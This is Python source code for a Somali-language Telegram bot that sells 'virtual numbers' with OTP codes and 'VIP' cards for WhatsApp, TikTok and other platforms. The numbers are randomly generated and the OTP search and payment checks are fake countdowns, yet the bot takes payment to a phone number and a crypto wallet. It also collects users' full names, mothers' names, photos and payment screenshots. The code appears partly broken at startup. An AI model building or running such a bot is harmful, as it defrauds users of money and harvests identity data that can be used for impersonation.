import os, random, asyncio, logging
from aiogram import Bot, Dispatcher, F, types
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654  # Admin ID

bot = Bot(BOT_TOKEN, default=types.DefaultBotProperties(parse_mode="Markdown"))
dp = Dispatcher(storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

users = {}
pending_admin = {}

# ================= STATES =================
class CardState(StatesGroup):
    full_name = State()
    mother = State()
    photo = State()
    payment_screenshot = State()

class CodeState(StatesGroup):
    code = State()

# ================= HELPERS =================
def normal_number():
    return "+25263" + "".join(str(random.randint(0,9)) for _ in range(7))

def vip_number():
    d = str(random.randint(4,9))
    return "+25263" + d*3 + str(random.randint(0,9)) + d*3

def generate_code():
    return "".join(random.choices("0123456789", k=6))

async def countdown(msg, text, sec=5):
    for i in range(sec,0,-1):
        await msg.edit_text(f"{text}\n⏳ {i} sec")
        await asyncio.sleep(1)
    await msg.edit_text("Processing...")

# ================= START =================
@dp.message(Command("start"))
async def start(msg: types.Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="New Order"), KeyboardButton(text="Check Code")]],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Service Bot 🤖\nDooro New Order ama Check Code", reply_markup=kb)

# ================= NEW ORDER =================
@dp.message(F.text=="New Order")
async def new_order(msg: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL", callback_data="virtual")],
        [InlineKeyboardButton(text="CARD", callback_data="card")]
    ])
    await msg.answer("Dooro adeeg:", reply_markup=kb)

# ================= VIRTUAL =================
@dp.callback_query(F.data=="virtual")
async def virtual(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="WhatsApp", callback_data="v_WhatsApp")],
        [InlineKeyboardButton(text="TikTok", callback_data="v_TikTok")],
        [InlineKeyboardButton(text="Google", callback_data="v_Google")],
        [InlineKeyboardButton(text="Telegram", callback_data="v_Telegram")]
    ])
    await call.message.edit_text("Dooro Platform:", reply_markup=kb)

@dp.callback_query(F.data.startswith("v_"))
async def virtual_process(call: types.CallbackQuery):
    platform = call.data.split("_")[1]
    number = normal_number()
    code = generate_code()
    users[call.from_user.id] = {
        "type":"virtual",
        "platform":platform,
        "number":number,
        "code":code
    }

    msg = await call.message.edit_text("OTP Searching...")
    await countdown(msg,"OTP Searching",5)

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="v_pay_local"),
         InlineKeyboardButton(text="CRYPTO", callback_data="v_pay_crypto")]
    ])
    await msg.edit_text(f"Number: {number}\nDir Lacagta si aad u hesho OTP...", reply_markup=kb)

# ================= VIRTUAL PAYMENT =================
@dp.callback_query(F.data=="v_pay_local")
async def v_local(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="v_confirm_pay"),
         InlineKeyboardButton(text="CANCEL", callback_data="cancel")]
    ])
    await call.message.edit_text(
        "Numberkan Lacagta ku dir:\n+252907868526",
        reply_markup=kb
    )

@dp.callback_query(F.data=="v_pay_crypto")
async def v_crypto(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="BNB - Copy", callback_data="copy_bnb")],
        [InlineKeyboardButton(text="USDT-BEP20 - Copy", callback_data="copy_usdt")],
        [InlineKeyboardButton(text="CONFIRM", callback_data="v_confirm_pay"),
         InlineKeyboardButton(text="CANCEL", callback_data="cancel")]
    ])
    text = (
        "Send Crypto:\n\n"
        "BNB: `0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`\n"
        "USDT-BEP20: `0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`\n\n"
        "Taabo Copy si aad nuqul u hesho."
    )
    await call.message.edit_text(text, reply_markup=kb)

@dp.callback_query(F.data.startswith("copy_"))
async def copy_address(call: types.CallbackQuery):
    token = call.data.split("_")[1]
    addr = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
    await call.message.answer(f"{token} Address Copied:\n{addr}")

@dp.callback_query(F.data=="v_confirm_pay")
async def v_confirm_pay(call: types.CallbackQuery):
    msg = await call.message.edit_text("Payment Processing...")
    await countdown(msg,"Payment Verification",10)
    if pending_admin.get(call.from_user.id) is None:
        await call.message.answer("PLEASE SEND MONEY 💵")
    else:
        await call.message.answer("Codsigaaga waa la diray Admin ka")

# ================= CARD ORDER =================
@dp.callback_query(F.data=="card")
async def card(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIP - $15", callback_data="vip")],
        [InlineKeyboardButton(text="NORMAL - $1", callback_data="normal")]
    ])
    await call.message.edit_text("Dooro Card Type:", reply_markup=kb)

@dp.callback_query(F.data.in_(["vip","normal"]))
async def card_type(call: types.CallbackQuery, state:FSMContext):
    number = vip_number() if call.data=="vip" else normal_number()
    users[call.from_user.id] = {
        "type":"card",
        "level":call.data,
        "number":number
    }
    await call.message.answer("Geli Magaca Saddexan:")
    await state.set_state(CardState.full_name)

@dp.message(CardState.full_name)
async def name(msg:types.Message,state:FSMContext):
    users[msg.from_user.id]["name"] = msg.text
    await msg.answer("Geli Magaca Hooyada:")
    await state.set_state(CardState.mother)

@dp.message(CardState.mother)
async def mother(msg:types.Message,state:FSMContext):
    users[msg.from_user.id]["mother"] = msg.text
    await msg.answer("Soo dir Sawirkaaga:")
    await state.set_state(CardState.photo)

@dp.message(CardState.photo, F.photo)
async def photo(msg:types.Message,state:FSMContext):
    users[msg.from_user.id]["photo"] = msg.photo[-1].file_id
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="c_pay_local"),
         InlineKeyboardButton(text="CRYPTO", callback_data="c_pay_crypto")]
    ])
    await msg.answer("Dooro Payment Method:", reply_markup=kb)

# ================= CARD PAYMENT =================
@dp.callback_query(F.data=="c_pay_local")
async def c_local(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="c_confirm_pay"),
         InlineKeyboardButton(text="CANCEL", callback_data="cancel")]
    ])
    await call.message.edit_text(
        "Numberkan Lacagta ku dir:\n+252907868526",
        reply_markup=kb
    )

@dp.callback_query(F.data=="c_pay_crypto")
async def c_crypto(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="BNB - Copy", callback_data="copy_bnb")],
        [InlineKeyboardButton(text="USDT-BEP20 - Copy", callback_data="copy_usdt")],
        [InlineKeyboardButton(text="CONFIRM", callback_data="c_confirm_pay"),
         InlineKeyboardButton(text="CANCEL", callback_data="cancel")]
    ])
    text = (
        "Send Crypto:\n\n"
        "BNB: `0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`\n"
        "USDT-BEP20: `0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`\n\n"
        "Taabo Copy si aad nuqul u hesho."
    )
    await call.message.edit_text(text, reply_markup=kb)

@dp.callback_query(F.data=="c_confirm_pay")
async def c_confirm_pay(call: CallbackQuery, state: FSMContext):
    msg = await call.message.edit_text("Payment Verification...")
    await countdown(msg,"Payment Verification",10)
    if pending_admin.get(call.from_user.id) is None:
        await call.message.answer("PLEASE SEND MONEY 💵")
    else:
        await call.message.answer("Codsigaaga waa la diray Admin ka")
    await call.message.answer("Fadlan soo dir Screenshot Lacag bixintaada:")
    await state.set_state(CardState.payment_screenshot)

@dp.message(CardState.payment_screenshot, F.photo)
async def screenshot(msg: Message, state: FSMContext):
    users[msg.from_user.id]["screenshot"] = msg.photo[-1].file_id
    user = users[msg.from_user.id]
    user["code"] = generate_code()
    pending_admin[msg.from_user.id] = True

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="APPROVE", callback_data=f"approve_{msg.from_user.id}")],
        [InlineKeyboardButton(text="REJECT", callback_data=f"reject_{msg.from_user.id}")]
    ])
    await bot.send_photo(
        ADMIN_ID,
        user["screenshot"],
        caption=f"Card Request\nName: {user['name']}\nMother: {user['mother']}\nLevel: {user['level']}\nNumber: {user['number']}",
        reply_markup=kb
    )
    await msg.answer("Codsigaaga waa la diray ⏳")
    await state.clear()

# ================= ADMIN ACTIONS =================
@dp.callback_query(F.data.startswith("approve_"))
async def approve(call: CallbackQuery):
    uid = int(call.data.split("_")[1])
    if uid in users:
        code = users[uid]["code"]
        await bot.send_message(uid,
            f"Approved ✅\nCode: {code}\nCodekan gali 'Check Code' si aad u hesho numberkaaga.")
        await call.message.edit_caption("Approved ✅")
        pending_admin[uid] = False

@dp.callback_query(F.data.startswith("reject_"))
async def reject(call: CallbackQuery):
    uid = int(call.data.split("_")[1])
    await bot.send_message(uid,"Rejected ❌")
    await call.message.edit_caption("Rejected ❌")
    pending_admin[uid] = False

# ================= CHECK CODE =================
@dp.message(F.text=="Check Code")
async def check(msg: Message, state: FSMContext):
    await msg.answer("Geli Code-ka:")
    await state.set_state(CodeState.code)

@dp.message(CodeState.code)
async def verify(msg: Message, state: FSMContext):
    data = users.get(msg.from_user.id)
    if data and msg.text == data.get("code"):
        await msg.answer(f"Number-kaaga:\n{data['number']}")
    else:
        await msg.answer("Code khaldan ❌")
    await state.clear()

# ================= CANCEL =================
@dp.callback_query(F.data=="cancel")
async def cancel(call: CallbackQuery):
    await call.message.edit_text("Cancelled ❌")

# ================= RUN BOT =================
async def main():
    await dp.start_polling()

if __name__=="__main__":
    asyncio.run(main())
